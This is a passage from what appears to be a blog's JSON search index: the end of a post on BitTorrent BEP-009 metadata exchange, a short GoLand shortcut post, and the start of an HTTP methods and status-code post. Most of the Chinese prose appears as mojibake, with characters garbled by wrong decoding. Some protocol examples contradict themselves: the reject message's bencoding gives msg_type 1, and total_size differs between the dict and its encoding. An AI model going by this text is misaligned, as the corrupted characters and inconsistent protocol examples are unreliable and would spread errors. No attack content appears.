å…¥swarmå¹¶èƒ½å¤Ÿå®Œæˆä¸‹è½½ã€‚è¿™ä¸ªæ‰©å±•èƒ½è®©å®¢æˆ·ç«¯ä»peerå“ªé‡Œä¸‹è½½metadataã€‚è¿™è®©æ”¯æŒmagnet linkæˆä¸ºäº†å¯èƒ½ï¼Œmagnet linkæ˜¯ä¸€ä¸ªwebé¡µä¸Šçš„é“¾æ¥ï¼Œä»…ä»…åŒ…å«äº†è¶³å¤ŸåŠ å…¥swarmçš„è¶³å¤Ÿä¿¡æ¯(info hash)</font>\n\n\n### 0x1: Metadata\n\nè¿™ä¸ªæ‰©å±•ä»…ä»…ä¼ è¾“.torrentæ–‡ä»¶çš„info-å­—å…¸å­—æ®µï¼Œè¿™ä¸ªéƒ¨åˆ†å¯ä»¥ç”±infohashæ¥éªŒè¯ã€‚åœ¨è¿™ç¯‡æ–‡æ¡£ä¸­ï¼Œ.torrentçš„è¿™ä¸ªéƒ¨åˆ†è¢«ç§°ä¸ºmetadataã€‚\n\nMetadataè¢«åˆ†å—ï¼Œæ¯ä¸ªå—æœ‰16KB(16384å­—èŠ‚)ï¼ŒMetadataå—ä»0å¼€å§‹ç´¢å¼•ï¼Œæ‰€æœ‰å¿«çš„å¤§å°éƒ½æ˜¯16KBï¼Œé™¤äº†æœ€åä¸€ä¸ªå—å¯èƒ½æ¯”16KBå°\n\n\n### 0x2: Extensionå¤´éƒ¨\n\nMetadataæ‰©å±•ä½¿ç”¨extensionåè®®(<font color=\"green\">__BEP0010__</font>)æ¥å£°ç§°å®ƒçš„å­˜åœ¨ã€‚å®ƒåœ¨extensionæ¡æ‰‹æ¶ˆæ¯çš„å¤´éƒ¨må­—å…¸åŠ å…¥ut_metadataé¡¹ã€‚å®ƒæ ‡è¯†äº†è¿™ä¸ªæ¶ˆæ¯å¯ä»¥ä½¿ç”¨è¿™ä¸ªæ¶ˆæ¯ç ï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥åœ¨æ¡æ‰‹æ¶ˆæ¯ä¸­åŠ å…¥metadata_sizeè¿™ä¸ªæ•´å‹å­—æ®µ(ä¸æ˜¯åœ¨må­—å…¸ä¸­)æ¥æŒ‡å®šmetadataçš„å­—èŠ‚æ•°\n\n```\n{'m': {'ut_metadata', 3}, 'metadata_size': 31235}\n```\n\n### 0x3: Extensionæ¶ˆæ¯\n\nExtensionæ¶ˆæ¯éƒ½æ˜¯bencodeç¼–ç ï¼Œè¿™é‡Œæœ‰3ç±»ä¸åŒçš„æ¶ˆæ¯\n\n\n+ request 0: \n\nè¯·æ±‚æ¶ˆæ¯å¹¶ä¸åœ¨å­—å…¸ä¸­é™„åŠ ä»»ä½•å…³é”®å­—ï¼Œè¿™ä¸ªæ¶ˆæ¯çš„å›å¤åº”å½“æ¥è‡ªæ”¯æŒè¿™ä¸ªæ‰©å±•çš„peerï¼Œæ˜¯ä¸€ä¸ªrejectæˆ–è€…dataæ¶ˆæ¯ï¼Œå›å¤å¿…é¡»å’Œè¯·æ±‚æ‰€æŒ‡å‡ºçš„ç‰‡ç›¸åŒ\nPeerå¿…é¡»ä¿è¯å®ƒæ‰€å‘é€çš„æ¯ä¸ªç‰‡éƒ½é€šè¿‡äº†infohashçš„æ£€æµ‹ã€‚å³ç›´åˆ°peerè·å¾—äº†æ•´ä¸ªmetadataå¹¶é€šè¿‡äº†infohashçš„éªŒè¯ï¼Œæ‰èƒ½å¤Ÿå‘é€ç‰‡(å³ä¸€ä¸ªpeeråº”è¯¥ä¿è¯è‡ªå·±å·²ç»å®Œæ•´ä»å…¶ä»–peerä¸­æ‹·è´äº†ä¸€ä»½ç›¸åŒçš„èµ„æºæ–‡ä»¶åï¼Œæ‰èƒ½ç»§ç»­å“åº”å…¶ä»–èŠ‚ç‚¹çš„æ‹·è´è¯·æ±‚)ã€‚Peersæ²¡æœ‰è·å¾—æ•´ä¸ªmetadataæ—¶ï¼Œå¯¹æ”¶åˆ°çš„æ‰€æœ‰metadataè¯·æ±‚éƒ½å¿…é¡»ç›´æ¥å›å¤rejectæ¶ˆæ¯\n\n```\n{'msg_type': 0, 'piece': 0}\nd8:msg_typei0e5:piecei0ee\n# è¿™ä»£è¡¨è¯·æ±‚æ¶ˆæ¯åœ¨è¯·æ±‚metadataçš„ç¬¬ä¸€ç‰‡\n```\n\n+ data 1\n\nè¿™ä¸ªdataæ¶ˆæ¯éœ€è¦åœ¨å­—å…¸ä¸­æ·»åŠ ä¸€ä¸ªæ–°çš„å­—æ®µï¼Œ\"total_size\".è¿™ä¸ªå…³é”®å­—æ®µå’Œextensionå¤´çš„\"metadata_size\"æœ‰ç›¸åŒçš„å«ä¹‰ï¼Œè¿™æ˜¯ä¸€ä¸ªæ•´å‹\n\nMetadataç‰‡è¢«æ·»åŠ åˆ°bencodeå­—å…¸åé¢ï¼Œä»–ä¸æ˜¯å­—å…¸çš„ä¸€éƒ¨åˆ†ï¼Œä½†æ˜¯æ˜¯æ¶ˆæ¯çš„ä¸€éƒ¨åˆ†(å¿…é¡»åŒ…æ‹¬é•¿åº¦å‰ç¼€)ã€‚\nå¦‚æœè¿™ä¸ªç‰‡æ˜¯metadataçš„æœ€åä¸€ä¸ªç‰‡ï¼Œä»–å¯èƒ½å°äº16KBã€‚å¦‚æœå®ƒä¸æ˜¯metadataçš„æœ€åä¸€ç‰‡ï¼Œé‚£å¤§å°å¿…é¡»æ˜¯16KB\n\n```\n{'msg_type': 1, 'piece': 0, 'total_size': 3425}\nd8:msg_typei1e5:piecei0e10:total_sizei34256eexxxxxxxx...\n# xè¡¨ç¤ºäºŒè¿›åˆ¶æ•°æ®(metadata) \n```\n\n+ reject 2\n\nRejectæ¶ˆæ¯æ²¡æœ‰é™„ä»¶çš„å…³é”®å­—ã€‚å®ƒçš„æ„æ€æ˜¯peeræ²¡æœ‰è¯·æ±‚çš„è¿™ä¸ªmetadataç‰‡ä¿¡æ¯ \n\nåœ¨å®¢æˆ·ç«¯æ”¶åˆ°æ”¶åˆ°ä¸€å®šæ•°ç›®çš„æ¶ˆæ¯åï¼Œå¯ä»¥é€šè¿‡æ‹’ç»è¯·æ±‚æ¶ˆæ¯æ¥è¿›è¡Œæ´ªæ³›æ”»å‡»ä¿æŠ¤ã€‚å°¤å…¶åœ¨metadataçš„æ•°ç›®ä¹˜ä¸Šä¸€ä¸ªå› å­æ—¶ \n\n```\n{'msg_type': 2, 'piece': 0}\nd8:msg_typei1e5:piecei0ee\n```\n\n### 0x4: requestæ¶ˆæ¯: Metadatä¿¡æ¯è·å–è¿‡ç¨‹\n\n+ æ‰©å±•æ”¯æŒäº¤äº’(äº’ç›¸è¯¢é—®å¯¹æ–¹æ”¯æŒå“ªäº›æ‰©å±•)\n\næ ¹æ®BEP-010æˆ‘ä»¬çŸ¥é“ï¼Œæ‰©å±•æ¶ˆæ¯ä¸€èˆ¬åœ¨Peer Wireæ¡æ‰‹ä¹‹åç«‹å³å‘å‡ºï¼Œæ˜¯ä¸€ä¸ªBç¼–ç çš„å­—å…¸\n\n```\n{\n    e: 0,\n    ipv4: xxx,\n    ipv6: xxx,\n    complete_ago: 1,\n    m:\n    {\n        upload_only: 3,\n        lt_donthave: 7,\n        ut_holepunch: 4,\n        ut_metadata: 2,\n        ut_pex: 1,\n        ut_comment: 6\n    },\n    matadata_size: 45377,\n    p: 33733,\n    reqq: 255,\n    v: BitTorrent 7.9.3\n    yp: 19616,\n    yourip: xxx\n}\n\n1. m: æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯æ”¯æŒçš„æ‰€æœ‰æ‰©å±•ä»¥åŠæ¯ä¸ªæ‰©å±•çš„ç¼–å·\n    1) ut_pex: è¡¨ç¤ºè¯¥å®¢æˆ·ç«¯æ”¯æŒPEX(Peer Exchange)\n    2) ut_metadataè¡¨ç¤ºæ”¯æŒBEP-009(ä¹Ÿå°±æ˜¯äº¤æ¢ç§å­æ–‡ä»¶çš„metadata)\n```\n\n+ æ¡æ‰‹handshake\n\n\næˆ‘ä»¬åœ¨å®ŒæˆåŒæ–¹æ¡æ‰‹ä¹‹åï¼Œå¹¶ä¸”å¾—åˆ°äº†å¯¹æ–¹æ”¯æŒçš„æ‰©å±•ä¿¡æ¯ã€‚èµ„æºè¯·æ±‚æ–¹ä¹Ÿé€šçŸ¥è¢«è¯·æ±‚æ–¹æœ¬æœºæ”¯æŒçš„æ‰©å±•æƒ…å†µï¼Œç„¶ååé¢æ¥ç€ä¸€ä¸ªæ‰©å±•æ¶ˆæ¯(ä»ä¸Šé¢çš„må­—å…¸å¯ä»¥çœ‹åˆ°å¯èƒ½ä¼šæœ‰å¤šç§ä¸åŒçš„æ‰©å±•æ¶ˆæ¯)ï¼Œå…·ä½“æ˜¯å“ªä¸ªç±»å‹çš„æ‰©å±•æ¶ˆæ¯ç”±message IDåé¢é‚£ä¸ªæ•°å­—å†³å®šï¼Œè¿™ä¸ªæ•°å­—å¯¹åº”ç€må­—å…¸ä¸­çš„ç¼–å·ã€‚è­¬å¦‚æˆ‘ä»¬è¿™é‡Œçš„æ¶ˆæ¯æ˜¯\n\n```\n00 00 00 1b 14 02 ... 00 00 00 1b \n1. æ¶ˆæ¯é•¿åº¦ä¸º 0x1b (27 bytes) \n2. 14 è¡¨ç¤ºæ˜¯ æ‰©å±•æ¶ˆæ¯(0x14 = 20)\n3. 02 å¯¹åº”ä¸Šé¢må­—å…¸ä¸­çš„ ut_metadataï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™ä¸ªæ¶ˆæ¯æ˜¯ut_metadataæ¶ˆæ¯\n```\n\n\nå†æ¬¡çœ‹ä¸Šå›¾çš„æˆªå›¾ï¼Œæˆ‘ä»¬è¿™é‡Œçš„å›¾æ˜¾ç¤ºçš„æ˜¯[msg_type: 0, piece: 2]æ­£æ˜¯requestæ¶ˆæ¯ï¼Œæ„æ€æ˜¯å‘å¯¹è±¡è¯·æ±‚ç¬¬äºŒä¸ªpieceçš„æ•°æ®ï¼Œpieceçš„æ„æ€æ˜¯åˆ†å—çš„æ„æ€ï¼Œæ ¹æ®BEP-009æˆ‘ä»¬çŸ¥é“ï¼Œç§å­æ–‡ä»¶çš„metadataï¼ˆä¹Ÿå°±æ˜¯infoéƒ¨åˆ†ï¼‰ä¼šæŒ‰16KBåˆ†æˆè‹¥å¹²å—ï¼Œé™¤æœ€åä¸€å—æ¯ä¸€å—çš„å¤§å°éƒ½æ˜¯16KBï¼Œæ¯ä¸€å—ä»0å¼€å§‹æŒ‰é¡ºåºè¿›è¡Œç¼–å·ã€‚æ‰€ä»¥è¿™ä¸ªè¯·æ±‚çš„æ„æ€å°±æ˜¯å‘å¯¹è±¡è¯·æ±‚ç¬¬ä¸‰å—çš„metadata\n\n\n\n+ å›å¤dataä¿¡æ¯\n\n\nä»å›¾ä¸­å½¢è±¡çš„è¡¨ç¤ºå¯ä»¥çœ‹åˆ°torrentæ–‡ä»¶æ•´ä¸ªinfoçš„é•¿åº¦ä¸º45377ï¼Œè¿™ä¸ªå€¼æ­£æ˜¯ä¸Šé¢æ¡æ‰‹æŠ¥æ–‡åçš„æ‰©å±•æ¶ˆæ¯ä¸­çš„metadata_sizeçš„å€¼ã€‚åœ¨å‘é€requestæ¶ˆæ¯ä¹‹åï¼Œæ¥ä¸‹æ¥å¯¹æ–¹åº”è¯¥å›å¤dataæ¶ˆæ¯ï¼ˆå¦‚æœå¯¹æ–¹æœ‰æ•°æ®ï¼‰æˆ–rejectæ¶ˆæ¯ï¼ˆå¦‚æœå¯¹æ–¹æ²¡æœ‰æ•°æ®ï¼‰ã€‚\n\n\nmsg_typeä¸º1è¡¨ç¤ºæ˜¯å›å¤å°±æ˜¯æˆ‘æ‰€éœ€è¦çš„æ•°æ®ï¼Œä½†æ˜¯æ³¨æ„è¿™é‡Œçš„æ•°æ®å¹¶æ²¡å®Œï¼Œç”±äºuTPåè®®çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®connection idæ‰¾åˆ°è¿™ä¸ªè¿æ¥åç»­çš„æ‰€æœ‰æ•°æ®ã€‚ è¿™é‡Œå…¶å®ä¸€å…±æ”¶åˆ°äº†ä¸‰ä¸ªæ¶ˆæ¯ï¼Œæˆ‘ä»¬åˆ†åˆ«æ¥çœ‹ä¸€ä¸‹\n\n```\n00 00 00 03 09 83 c5 --> message IDä¸º9ï¼Œportæ¶ˆæ¯ï¼Œè¡¨ç¤ºç«¯å£å·ä¸º0x83c5 = 33733\n00 00 00 03 14 03 01 --> message IDä¸º20(0x14)ï¼Œextendæ¶ˆæ¯ï¼Œç¼–å·03ä¸ºupload_onlyï¼Œè¡¨ç¤ºè®¾ç½®upload_only = 1\n00 00 31 70 14 02 xx --> message IDä¸º20(0x14)ï¼Œextendæ¶ˆæ¯ï¼Œç¼–å·02ä¸ºut_metadataï¼Œåé¢çš„xxè¡¨ç¤º[msg_type: 1, piece: 2, total_size: 45377]å’Œç›¸åº”å—çš„metadataæ•°æ®\n```\n\n\nçœ‹ç¬¬ä¸‰ä¸ªæ¶ˆæ¯å¯ä»¥çŸ¥é“æ¶ˆæ¯é•¿åº¦ä¸º0x3170ï¼Œè¿™ä¸ªé•¿åº¦åŒ…æ‹¬äº†[msg_type...]è¿™ä¸€ä¸²å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œå…±0x2fä¸ªå­—èŠ‚ï¼Œæˆ‘ä»¬å°†å…¶å‡å»å°±å¾—åˆ°äº†piece2çš„é•¿åº¦ï¼š0x3170 - 0x2f = 0x3141 æˆ‘ä»¬ä¸Šé¢è¯´è¿‡æ¯ä¸ªå—çš„å¤§å°åº”è¯¥æ˜¯16KBï¼Œä¹Ÿå°±æ˜¯0x4000ï¼Œè¿™é‡Œçš„å¤§å°ä¸º0x3141ï¼Œåªå¯èƒ½æ˜¯æœ€åä¸€å—ã€‚æˆ‘ä»¬ç¨å¾®è®¡ç®—éªŒè¯ä¸‹ï¼Œå°†æ•´ä¸ªinfoçš„é•¿åº¦45377(0xb141)æŒ‰16KBåˆ†å—\n\n```\npiece 0: 0x0001 ~ 0x4000 é•¿åº¦0x4000\npiece 1: 0x4001 ~ 0x8000 é•¿åº¦0x4000\npiece 2: 0x8001 ~ 0xb141 é•¿åº¦0x3141\n```\n\n\nå¯ä»¥çœ‹åˆ°piece2æ­£æ˜¯æœ€åä¸€å—ï¼Œå¤§å°ä¸º0x3141ã€‚è‡³æ­¤æˆ‘ä»¬å¾—åˆ°äº†ç¬¬äºŒå—çš„metadataï¼Œç„¶åé€šè¿‡requestæ¶ˆæ¯è·å–piece0å’Œpiece1è·å–ç¬¬ä¸€å’Œç¬¬äºŒå—çš„metadataï¼Œå°†ä¸‰å—çš„æ¶ˆæ¯åˆå¹¶æˆtorrentæ–‡ä»¶infoå­—æ®µï¼Œç„¶åå†åŠ ä¸Šcreate dateã€create byæˆ–commentç­‰ä¿¡æ¯ï¼Œç§å­æ–‡ä»¶å°±ç®—å®Œæˆä¸‹è½½äº†ã€‚<font color=\"red\">å¯è§è¦åœ¨BTç½‘ç»œä¸­å®Œæˆå®é™…çš„èµ„æºä¸‹è½½ï¼Œå°±å¿…é¡»å®Œæ•´è·å–åˆ°ç§å­æ–‡ä»¶ï¼Œå› ä¸ºç§å­æ–‡ä»¶ä¸­ä¸å•æœ‰infohashå€¼ï¼Œè¿˜æœ‰piece sha1æ ¡éªŒç ï¼Œåˆ†å—ä¸‹è½½æ—¶éœ€è¦è¿›è¡Œæ ¡éªŒï¼Œè€Œç£åŠ›è¿æ¥magnetåªæ˜¯ä¸€ä¸ªæœ€å°åŒ–å…¥å£ï¼Œæœ€ç»ˆè¿˜æ˜¯éœ€è¦é€šè¿‡ç£åŠ›è¿æ¥åœ¨DHTç½‘ç»œä¸­è·å–ç§å­æ–‡ä»¶çš„å®Œæ•´ä¿¡æ¯</font>\n\n\n\n### 0x5: æ ¡éªŒinfo_hash\n\næˆ‘ä»¬å°†ä»DHTç½‘ç»œä¸­ä¸‹è½½çš„ç§å­æ–‡ä»¶å’ŒåŸå§‹çš„ç§å­æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒï¼Œå¯ä»¥çœ‹åˆ°annouceå’Œannouce-listå­—æ®µéƒ½ä¸¢æ‰äº†(å¼•å…¥äº†DHTç½‘ç»œåï¼ŒBTå¯ä»¥å®ç°Trackerless)ï¼Œcreate dateå‘ç”Ÿäº†å˜åŒ–ï¼Œinfoå­—æ®µä¸å˜\n\nç£åŠ›é“¾æ˜¯ä¸ºäº†ç®€åŒ–BTç§å­æ–‡ä»¶çš„åˆ†å‘ï¼Œå°è£…äº†ä¸€ä¸ªç®€åŒ–ç‰ˆçš„magnet urlï¼Œå®¢æˆ·ç«¯è§£æè¿™ä¸ªmagnetç£åŠ›é“¾ä¹‹åï¼Œéœ€è¦åœ¨DHTç½‘ç»œä¸­å¯»æ‰¾infohashå¯¹åº”çš„peerèŠ‚ç‚¹ï¼Œè·å–èŠ‚ç‚¹æˆåŠŸåï¼Œå‘ç›®æ ‡peerèŠ‚ç‚¹è·å–çœŸæ­£çš„BitTorrentç§å­(.torrentæ–‡ä»¶)ä¿¡æ¯(åŒ…å«äº†å®Œæ•´çš„pieces SHA1æ‚å‡‘ä¿¡æ¯)ï¼Œå¦ä¸€ä¸ªæ¸ é“å°±æ˜¯ä¼ ç»Ÿçš„Btç§å­è®ºå›ä¼šåˆ†å‘.BTç§å­æ–‡ä»¶\n\n\n\n\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://www.cnblogs.com/LittleHann/p/6180296.html","tags":["dht"],"categories":["BitTorrent"]},{"title":"golang_ide_golandä½¿ç”¨","url":"%2Fp%2F5a4d0049.html","content":"\n\n\n# 1. ä¿å­˜æ–‡ä»¶è‡ªåŠ¨æ ¼å¼åŒ–å’Œå¯¼å…¥\n\n`go fmt + go imports`\n\ngo to preferences ->Tools ->File Watchers and enable go fmt . This way on each save it will format the file.\n\n\ngoland tools->filewatchers->go fmt| go imports\n\n<!-- more -->\n\n\n\n# 2. å¿«æ·é”®\n\n+ åˆ é™¤è¡Œ cmd + x\n\n+ å¤åˆ¶è¡Œ cmd + d\n\n+ è¿›å…¥è¿”å›å‡½æ•° cmd + [] \n\n  \n\n# 3. å°æŠ€å·§\n\n### 3.1 sturctæŸ¥çœ‹\n\n+ çœ‹å®šä¹‰æ‰€æœ‰çš„æ–¹æ³•  cmd + b, æˆ–è€…é¼ æ ‡å·¦é”®\n+ æŸ¥çœ‹structå®ç°äº†å“ªäº›æ¥å£ cmd + u\n\n\n\n### 3.2 interfaceæŸ¥çœ‹\n\n- æŸ¥çœ‹å®ç°çš„Structçš„åˆ—è¡¨    ctrl + h\n\n\n\n### 3.3 å°æŠ€å·§\n\n+ å‘¼å‡ºæœ€è¿‘æ–‡ä»¶å’Œå¸¸ç”¨åŠŸèƒ½ CMD + E , favorites å¯ä»¥æŸ¥çœ‹ä¹¦ç­¾/æ–­ç‚¹/æ”¶è—\n\n+ æ–‡ä»¶å¯¼èˆª  cmd + 7\n\n  æŠ˜å , å±•å¼€,è®¾ç½®,éšè—\n\n  æŒ‰å¯¼å‡ºæ’åº(å»ºè®®), æŒ‰å­—æ¯æ’åº(å»ºè®®),  ç§æœ‰å‡½æ•°(å»ºè®®),  éå½“å‰æ–‡ä»¶çš„å±æ€§(ä¸å»ºè®®)\n\n\n\n### 3.4 å…¶ä»–\n\n+ å„ç§æœç´¢ ä¸¤æ¬¡ shift\n\n+ æ¯”è¾ƒæ–‡ä»¶ é€‰æ‹©ä¸¤ä¸ªæ–‡ä»¶ cmd+d, æ–¹ä¾¿æ¯”è¾ƒjson\n\n","tags":["golang"],"categories":["golang"]},{"title":"httpçš„ä»‹ç»","url":"%2Fp%2Fb03bc449.html","content":"\n# 1. http ä»‹ç»\n\n### 1.1 method\n\nHTTP1.0 å®šä¹‰äº†ä¸‰ç§è¯·æ±‚æ–¹æ³•ï¼š GET, POST å’Œ HEADæ–¹æ³•ã€‚\n\nHTTP1.1 æ–°å¢äº†å…­ç§è¯·æ±‚æ–¹æ³•ï¼šOPTIONSã€PUTã€PATCHã€DELETEã€TRACE å’Œ CONNECT æ–¹æ³•ã€‚\n\n<!-- more -->\n\n| åºå· | æ–¹æ³•    | æè¿°                                                         |\n| :--- | :------ | :----------------------------------------------------------- |\n| 1    | GET     | è¯·æ±‚æŒ‡å®šçš„é¡µé¢ä¿¡æ¯ï¼Œå¹¶è¿”å›å®ä½“ä¸»ä½“ã€‚                         |\n| 2    | HEAD    | ç±»ä¼¼äº GET è¯·æ±‚ï¼Œåªä¸è¿‡è¿”å›çš„å“åº”ä¸­æ²¡æœ‰å…·ä½“çš„å†…å®¹ï¼Œç”¨äºè·å–æŠ¥å¤´ |\n| 3    | POST    | å‘æŒ‡å®šèµ„æºæäº¤æ•°æ®è¿›è¡Œå¤„ç†è¯·æ±‚ï¼ˆä¾‹å¦‚æäº¤è¡¨å•æˆ–è€…ä¸Šä¼ æ–‡ä»¶ï¼‰ã€‚æ•°æ®è¢«åŒ…å«åœ¨è¯·æ±‚ä½“ä¸­ã€‚POST è¯·æ±‚å¯èƒ½ä¼šå¯¼è‡´æ–°çš„èµ„æºçš„å»ºç«‹å’Œ/æˆ–å·²æœ‰èµ„æºçš„ä¿®æ”¹ã€‚ |\n| 4    | PUT     | ä»å®¢æˆ·ç«¯å‘æœåŠ¡å™¨ä¼ é€çš„æ•°æ®å–ä»£æŒ‡å®šçš„æ–‡æ¡£çš„å†…å®¹ã€‚             |\n| 5    | DELETE  | è¯·æ±‚æœåŠ¡å™¨åˆ é™¤æŒ‡å®šçš„é¡µé¢ã€‚                                   |\n| 6    | CONNECT | HTTP/1.1 åè®®ä¸­é¢„ç•™ç»™èƒ½å¤Ÿå°†è¿æ¥æ”¹ä¸ºç®¡é“æ–¹å¼çš„ä»£ç†æœåŠ¡å™¨ã€‚    |\n| 7    | OPTIONS | å…è®¸å®¢æˆ·ç«¯æŸ¥çœ‹æœåŠ¡å™¨çš„æ€§èƒ½ã€‚                                 |\n| 8    | TRACE   | å›æ˜¾æœåŠ¡å™¨æ”¶åˆ°çš„è¯·æ±‚ï¼Œä¸»è¦ç”¨äºæµ‹è¯•æˆ–è¯Šæ–­ã€‚                   |\n| 9    | PATCH   | æ˜¯å¯¹ PUT æ–¹æ³•çš„è¡¥å……ï¼Œç”¨æ¥å¯¹å·²çŸ¥èµ„æºè¿›è¡Œå±€éƒ¨æ›´æ–° ã€‚           |\n\n### 1.2 çŠ¶æ€ç \n\n| çŠ¶æ€ç  | çŠ¶æ€ç è‹±æ–‡åç§°                  | ä¸­æ–‡æè¿°                                                     |\n| :----- | :------------------------------ | :----------------------------------------------------------- |\n| 100    | Continue                        | ç»§ç»­ã€‚[å®¢æˆ·ç«¯](http://www.dreamdu.com/webbuild/client_vs_server/)åº”ç»§ç»­å…¶è¯·æ±‚ |\n| 101    | Switching Protocols             | åˆ‡æ¢åè®®ã€‚æœåŠ¡å™¨æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚åˆ‡æ¢åè®®ã€‚åªèƒ½åˆ‡æ¢åˆ°æ›´é«˜çº§çš„åè®®ï¼Œä¾‹å¦‚ï¼Œåˆ‡æ¢åˆ°HTTPçš„æ–°ç‰ˆæœ¬åè®® |\n|        |                                 |                                                              |\n| 200    | OK                              | è¯·æ±‚æˆåŠŸã€‚ä¸€èˆ¬ç”¨äºGETä¸POSTè¯·æ±‚                              |\n| 201    | Created                         | å·²åˆ›å»ºã€‚æˆåŠŸè¯·æ±‚å¹¶åˆ›å»ºäº†æ–°çš„èµ„æº                             |\n| 202    | Accepted                        | å·²æ¥å—ã€‚å·²ç»æ¥å—è¯·æ±‚ï¼Œä½†æœªå¤„ç†å®Œæˆ                           |\n| 203    | Non-Authoritative Information   | éæˆæƒä¿¡æ¯ã€‚è¯·æ±‚æˆåŠŸã€‚ä½†è¿”å›çš„metaä¿¡æ¯ä¸åœ¨åŸå§‹çš„æœåŠ¡å™¨ï¼Œè€Œæ˜¯ä¸€ä¸ªå‰¯æœ¬ |\n| 204    | No Content                      | æ— å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†ï¼Œä½†æœªè¿”å›å†…å®¹ã€‚åœ¨æœªæ›´æ–°ç½‘é¡µçš„æƒ…å†µä¸‹ï¼Œå¯ç¡®ä¿æµè§ˆå™¨ç»§ç»­æ˜¾ç¤ºå½“å‰æ–‡æ¡£ |\n| 205    | Reset Content                   | é‡ç½®å†…å®¹ã€‚æœåŠ¡å™¨å¤„ç†æˆåŠŸï¼Œç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰åº”é‡ç½®æ–‡æ¡£è§†å›¾ã€‚å¯é€šè¿‡æ­¤è¿”å›ç æ¸…é™¤æµè§ˆå™¨çš„è¡¨å•åŸŸ |\n| 206    | Partial Content                 | éƒ¨åˆ†å†…å®¹ã€‚æœåŠ¡å™¨æˆåŠŸå¤„ç†äº†éƒ¨åˆ†GETè¯·æ±‚                        |\n|        |                                 |                                                              |\n| 300    | Multiple Choices                | å¤šç§é€‰æ‹©ã€‚è¯·æ±‚çš„èµ„æºå¯åŒ…æ‹¬å¤šä¸ªä½ç½®ï¼Œç›¸åº”å¯è¿”å›ä¸€ä¸ªèµ„æºç‰¹å¾ä¸åœ°å€çš„åˆ—è¡¨ç”¨äºç”¨æˆ·ç»ˆç«¯ï¼ˆä¾‹å¦‚ï¼šæµè§ˆå™¨ï¼‰é€‰æ‹© |\n| 301    | Moved Permanently               | æ°¸ä¹…ç§»åŠ¨ã€‚è¯·æ±‚çš„èµ„æºå·²è¢«æ°¸ä¹…çš„ç§»åŠ¨åˆ°æ–°URIï¼Œè¿”å›ä¿¡æ¯ä¼šåŒ…æ‹¬æ–°çš„URIï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨å®šå‘åˆ°æ–°URIã€‚ä»Šåä»»ä½•æ–°çš„è¯·æ±‚éƒ½åº”ä½¿ç”¨æ–°çš„URIä»£æ›¿ |\n| 302    | Found                           | ä¸´æ—¶ç§»åŠ¨ã€‚ä¸301ç±»ä¼¼ã€‚ä½†èµ„æºåªæ˜¯ä¸´æ—¶è¢«ç§»åŠ¨ã€‚å®¢æˆ·ç«¯åº”ç»§ç»­ä½¿ç”¨åŸæœ‰URI |\n| 303    | See Other                       | æŸ¥çœ‹å…¶å®ƒåœ°å€ã€‚ä¸301ç±»ä¼¼ã€‚ä½¿ç”¨GETå’ŒPOSTè¯·æ±‚æŸ¥çœ‹               |\n| 304    | Not Modified                    | æœªä¿®æ”¹ã€‚æ‰€è¯·æ±‚çš„èµ„æºæœªä¿®æ”¹ï¼ŒæœåŠ¡å™¨è¿”å›æ­¤çŠ¶æ€ç æ—¶ï¼Œä¸ä¼šè¿”å›ä»»ä½•èµ„æºã€‚å®¢æˆ·ç«¯é€šå¸¸ä¼šç¼“å­˜è®¿é—®è¿‡çš„èµ„æºï¼Œé€šè¿‡æä¾›ä¸€ä¸ªå¤´ä¿¡æ¯æŒ‡å‡ºå®¢æˆ·ç«¯å¸Œæœ›åªè¿”å›åœ¨æŒ‡å®šæ—¥æœŸä¹‹åä¿®æ”¹çš„èµ„æº |\n| 305    | Use Proxy                       | ä½¿ç”¨ä»£ç†ã€‚æ‰€è¯·æ±‚çš„èµ„æºå¿…é¡»é€šè¿‡ä»£ç†è®¿é—®                       |\n| 306    | Unused                          | å·²ç»è¢«åºŸå¼ƒçš„HTTPçŠ¶æ€ç                                        |\n| 307    | Temporary Redirect              | ä¸´æ—¶é‡å®šå‘ã€‚ä¸302ç±»ä¼¼ã€‚ä½¿ç”¨GETè¯·æ±‚é‡å®šå‘                     |\n|        |                                 |                                                              |\n| 400    | Bad Request                     | å®¢æˆ·ç«¯è¯·æ±‚çš„è¯­æ³•é”™è¯¯ï¼ŒæœåŠ¡å™¨æ— æ³•ç†è§£                         |\n| 401    | Unauthorized                    | è¯·æ±‚è¦æ±‚ç”¨æˆ·çš„èº«ä»½è®¤è¯                                       |\n| 402    | Payment Required                | ä¿ç•™ï¼Œå°†æ¥ä½¿ç”¨                                               |\n| 403    | Forbidden                       | æœåŠ¡å™¨ç†è§£è¯·æ±‚å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œä½†æ˜¯æ‹’ç»æ‰§è¡Œæ­¤è¯·æ±‚               |\n| 404    | Not Found                       | æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯çš„è¯·æ±‚æ‰¾åˆ°èµ„æºï¼ˆç½‘é¡µï¼‰ã€‚é€šè¿‡æ­¤ä»£ç ï¼Œç½‘ç«™è®¾è®¡äººå‘˜å¯è®¾ç½®\"æ‚¨æ‰€è¯·æ±‚çš„èµ„æºæ— æ³•æ‰¾åˆ°\"çš„ä¸ªæ€§é¡µé¢ |\n| 405    | Method Not Allowed              | å®¢æˆ·ç«¯è¯·æ±‚ä¸­çš„æ–¹æ³•è¢«ç¦æ­¢                                     |\n| 406    | Not Acceptable                  | æœåŠ¡å™¨æ— æ³•æ ¹æ®å®¢æˆ·ç«¯è¯·æ±‚çš„å†…å®¹ç‰¹æ€§å®Œæˆè¯·æ±‚                   |\n| 407    | Proxy Authentication Required   | è¯·æ±‚è¦æ±‚ä»£ç†çš„èº«ä»½è®¤è¯ï¼Œä¸401ç±»ä¼¼ï¼Œä½†è¯·æ±‚è€…åº”å½“ä½¿ç”¨ä»£ç†è¿›è¡Œæˆæƒ |\n| 408    | Request Time-out                | 